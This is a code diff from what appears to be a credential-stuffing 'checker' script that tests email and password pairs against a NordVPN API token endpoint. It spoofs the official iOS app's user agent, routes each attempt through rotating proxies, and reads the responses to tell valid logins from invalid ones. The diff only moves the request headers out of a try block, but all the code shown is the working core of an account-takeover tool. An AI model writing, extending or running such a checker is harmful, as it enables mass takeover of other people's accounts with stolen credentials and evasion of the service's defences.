@@ -8,22 +8,22 @@ def check(email:str,password:str):
     retries = 0
     while retries != checker.retries:
         proxy = set_proxy()
+        data = f"password={password}&username={email}"
+        header_1 = {
+            "Content-Type":"application/x-www-form-urlencoded",
+            "Host": "zwyr157wwiu6eior.com" ,
+            "Connection": "keep-alive" ,
+            "Accept": "*/*" ,
+            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
+            "Content-Length": "51" ,
+            "Accept-Language": "en-us" ,
+            "Accept-Encoding": "gzip, deflate, br"
+        }
+        header_2 = {
+            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
+            "Authorization": "" 
+        }
         try:
-            data = f"password={password}&username={email}"
-            header_1 = {
-                "Content-Type":"application/x-www-form-urlencoded",
-                "Host": "zwyr157wwiu6eior.com" ,
-                "Connection": "keep-alive" ,
-                "Accept": "*/*" ,
-                "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
-                "Content-Length": "51" ,
-                "Accept-Language": "en-us" ,
-                "Accept-Encoding": "gzip, deflate, br"
-            }
-            header_2 = {
-                "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
-                "Authorization": "" 
-            }
             a = post("https://zwyr157wwiu6eior.com/v1/users/tokens",data=data,headers=header_1,proxies=set_proxy(proxy),timeout=checker.timeout)
             if "Invalid username" in a.text or "Invalid password" in a.text:
                 retries += 1
